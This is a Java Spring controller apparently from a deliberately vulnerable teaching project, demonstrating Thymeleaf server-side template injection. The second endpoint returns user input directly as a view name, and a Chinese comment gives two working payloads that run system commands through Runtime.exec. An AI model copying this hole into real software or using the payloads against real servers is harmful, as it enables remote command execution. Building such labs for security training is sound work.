package com.example.vulnerablejava.controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import com.example.vulnerablejava.entity.Image;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;

@Api(tags = "Thymeleaf注入漏洞")
@Controller
@RequestMapping("/thymeleaf")
public class ThymeleafController {
    /**
     * 渲染文件用法
     */
    @ApiOperation("渲染文件")
    @GetMapping("1")
    public String thymeleaf1(Model model, String name) {
        if (name==null || "".equals(name)) {
            name="test.jpg";
        }
        Image image = new Image();
        image.setName(name);
        image.setUrl("https://www.example.com/");
        model.addAttribute("image", image);
        return "index.html";
    }

    /**
     * 存在漏洞，thymeleaf-spring<=3.0.12时(例如: <spring-boot.version>2.4.1</spring-boot.version>)，存在SSTI漏洞
     * 攻击者传入如下payload即可执行系统命令
     * ?name=__${T(java.lang.Runtime).getRuntime().exec("open -a Calculator")}__::.x
     * 或
     * ?name=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27whoami%27).getInputStream()).next()%7d__::.x
     */
    @ApiOperation("存在漏洞")
    @GetMapping("2")
    public String thymeleaf2(String name) {
        return name;
    }
}